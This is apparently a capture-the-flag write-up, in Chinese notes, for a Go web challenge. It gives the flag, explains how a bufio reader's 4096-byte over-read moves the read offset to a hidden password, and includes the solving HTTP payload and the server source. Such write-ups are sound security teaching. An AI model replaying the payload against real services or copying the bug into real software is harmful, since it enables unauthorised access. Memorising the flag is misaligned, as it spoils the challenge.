- flag: `idek{BufF3r_0wn3rsh1p_c4n_b1t3!}`
- # 思路
	- 题目会新建一个reader读取`randomData`这个byte数组，然后可以通过提交一个数组多次控制这个reader读取1\~100B的数据
	- 使用reader后，题目会再次从`reader`中读取32B的数据，验证是否和`randomBytes[12625:12625+32]`相同
	- 注意到题目中含有一个`bufio`，可以使用其一次性读取4096B的数据，从而绕过“读取1\~100B数据”这个限制，让`Validate`读取到12625处的数据
- # Payload
	- ```http
	  GET /just-read-it HTTP/1.1
	  Host: readme.chal.idek.team:1337
	  Upgrade-Insecure-Requests: 1
	  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
	  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	  Accept-Encoding: gzip, deflate
	  Accept-Language: en-US,en;q=0.9
	  Connection: close
	  Content-Length: 38
	  
	  {"orders":[100,100,100,99,99,99,40]}
	  
	  ```
- # 源码
	- ```go
	  package main
	  
	  import (
	  	"bufio"
	  	"bytes"
	  	"context"
	  	"crypto/sha256"
	  	"encoding/json"
	  	"errors"
	  	"fmt"
	  	"io"
	  	"io/ioutil"
	  	"math/rand"
	  	"net/http"
	  	"os"
	  	"time"
	  )
	  
	  var password = sha256.Sum256([]byte("idek"))
	  var randomData []byte
	  
	  const (
	  	MaxOrders = 10
	  )
	  // 生成randomData并覆盖password[]
	  func initRandomData() {
	  	rand.Seed(1337)
	  	randomData = make([]byte, 24576)
	  	if _, err := rand.Read(randomData); err != nil {
	  		panic(err)
	  	}
	  	copy(randomData[12625:], password[:])
	  }
	  
	  type ReadOrderReq struct {
	  	Orders []int `json:"orders"`
	  }
	  
	  func justReadIt(w http.ResponseWriter, r *http.Request) {
	  	defer r.Body.Close()
	  
	  	// 读取body
	  	body, err := ioutil.ReadAll(r.Body)
	  	if err != nil {
	  		w.WriteHeader(500)
	  		w.Write([]byte("bad request\n"))
	  		return
	  	}
	  
	  	// 读取JSON
	  	reqData := ReadOrderReq{}
	  	if err := json.Unmarshal(body, &reqData); err != nil {
	  		w.WriteHeader(500)
	  		w.Write([]byte("invalid body\n"))
	  		return
	  	}
	  
	  	// 检查orders数组长度
	  	if len(reqData.Orders) > MaxOrders {
	  		w.WriteHeader(500)
	  		w.Write([]byte("whoa there, max 10 orders!\n"))
	  		return
	  	}
	  
	  	reader := bytes.NewReader(randomData)
	  	validator := NewValidator()
	  
	  	ctx := context.Background()
	  	for _, o := range reqData.Orders {
	  		// 检查o的数值
	  		if err := validator.CheckReadOrder(o); err != nil {
	  			w.WriteHeader(500)
	  			w.Write([]byte(fmt.Sprintf("error: %v\n", err)))
	  			return
	  		}
	  
	  		// context: 读取随机数据的reader和输入的buffer大小
	  		ctx = WithValidatorCtx(ctx, reader, int(o))
	  		// 丢掉相应大小的数据
	  		_, err := validator.Read(ctx)
	  		if err != nil {
	  			w.WriteHeader(500)
	  			w.Write([]byte(fmt.Sprintf("failed to read: %v\n", err)))
	  			return
	  		}
	  	}
	  
	  	if err := validator.Validate(ctx); err != nil {
	  		w.WriteHeader(500)
	  		w.Write([]byte(fmt.Sprintf("validation failed: %v\n", err)))
	  		return
	  	}
	  
	  	w.WriteHeader(200)
	  	w.Write([]byte(os.Getenv("FLAG")))
	  }
	  
	  // 启动后台
	  func main() {
	  	if _, exists := os.LookupEnv("LISTEN_ADDR"); !exists {
	  		panic("env LISTEN_ADDR is required")
	  	}
	  	if _, exists := os.LookupEnv("FLAG"); !exists {
	  		panic("env FLAG is required")
	  	}
	  
	  	initRandomData()
	  
	  	http.HandleFunc("/just-read-it", justReadIt)
	  
	  	srv := http.Server{
	  		Addr:         os.Getenv("LISTEN_ADDR"),
	  		ReadTimeout:  5 * time.Second,
	  		WriteTimeout: 5 * time.Second,
	  	}
	  
	  	fmt.Printf("Server listening on %s\n", os.Getenv("LISTEN_ADDR"))
	  	if err := srv.ListenAndServe(); err != nil {
	  		panic(err)
	  	}
	  }
	  
	  type Validator struct{}
	  
	  func NewValidator() *Validator {
	  	return &Validator{}
	  }
	  
	  // 检查输入是否在1~100内
	  func (v *Validator) CheckReadOrder(o int) error {
	  	if o <= 0 || o > 100 {
	  		return fmt.Errorf("invalid order %v", o)
	  	}
	  	return nil
	  }
	  
	  // 读取context内的reader
	  func (v *Validator) Read(ctx context.Context) ([]byte, error) {
	  	r, s := GetValidatorCtxData(ctx)
	  	buf := make([]byte, s)
	  	_, err := r.Read(buf)
	  	if err != nil {
	  		return nil, fmt.Errorf("read error: %v", err)
	  	}
	  	return buf, nil
	  }
	  
	  // 检查context内的reader中的buf是否和password相同
	  func (v *Validator) Validate(ctx context.Context) error {
	  	r, _ := GetValidatorCtxData(ctx)
	  	buf, err := v.Read(WithValidatorCtx(ctx, r, 32))
	  	if err != nil {
	  		return err
	  	}
	  	if bytes.Compare(buf, password[:]) != 0 {
	  		return errors.New("invalid password")
	  	}
	  	return nil
	  }
	  
	  const (
	  	reqValReaderKey = "readerKey"
	  	reqValSizeKey   = "reqValSize"
	  )
	  
	  // 读取context的两个kv
	  func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
	  	reader := ctx.Value(reqValReaderKey).(io.Reader)
	  	size := ctx.Value(reqValSizeKey).(int)
	  	if size >= 100 {
	  		// bufio 缓存，可能造成过量读取
	  		reader = bufio.NewReader(reader)
	  	}
	  	return reader, size
	  }
	  
	  // 为context加上两个kv
	  func WithValidatorCtx(ctx context.Context, r io.Reader, size int) context.Context {
	  	ctx = context.WithValue(ctx, reqValReaderKey, r)
	  	ctx = context.WithValue(ctx, reqValSizeKey, size)
	  	return ctx
	  }
	  ```